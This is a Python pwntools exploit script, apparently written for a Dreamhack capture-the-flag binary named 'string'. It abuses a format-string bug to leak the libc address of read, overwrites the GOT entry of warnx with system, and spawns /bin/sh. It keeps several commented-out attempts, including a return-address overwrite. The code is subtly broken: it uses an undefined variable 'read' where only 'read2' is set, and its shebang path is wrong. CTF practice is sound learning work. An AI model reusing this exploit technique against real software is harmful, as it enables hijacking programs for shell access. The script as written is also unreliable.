#!/bin/usr/python3

from pwn import *

p = process("./string")
# p = remote("host3.dreamhack.games",24002)
e = ELF("./string")
libc = ELF("./libc.so.6")

def Input(buf):
    p.sendlineafter(b'> ', b'1')
    p.sendlineafter(b': ', buf)
    
def Print():
    p.sendlineafter(b'> ', b'2')
    
    
# # Leak RA Stored Stack address
# Input(b"%73$p")
# Print()
# p.recvuntil(b"string: ")
# addr = int(p.recvline()[:-1], 16) - 0xbc
# # Input(b"3")
# print(hex(addr))

# Leak libc
read_got = e.got['read']
read_offset = libc.symbols['read']
system_offset = libc.symbols['system']


# payload = p32(read_got)
# payload += b"%x%x%x%x.%s"
# Input(payload)
# Print()
# p.recvuntil(b".")
# read = u32(p.recvn(4))
# print(hex(read))

payload = p32(read_got)
pause()
Input(payload)
Print()
p.recvuntil(b"string: ")
read2 = u32(p.recvline()[:-1])
print(hex(read2))

lb = read - read_offset #d4350
onegadget = lb + 0x5f066
system = lb + system_offset

#Input(p64())
print(hex(onegadget)) # 0x7fd4d25
print(hex(system))
fsb = fmtstr_payload(5, {e.got['warnx'] : system})
print(fsb)
# # Overwrite one_gadget to RA
# payload = p32(addr+2)
# payload += p32(addr)
# payload += f"%{0x07fd-0x8}c%5$hn".encode()
# payload += f"%{0x4d26-0x7fd}c%6$hn".encode()


# get shell
#Input(payload)
Input(fsb)
Print()
pause()
Input(b"/bin/sh\x00")
Print()
# p.sendlineafter(b'> ', b'3')
p.interactive()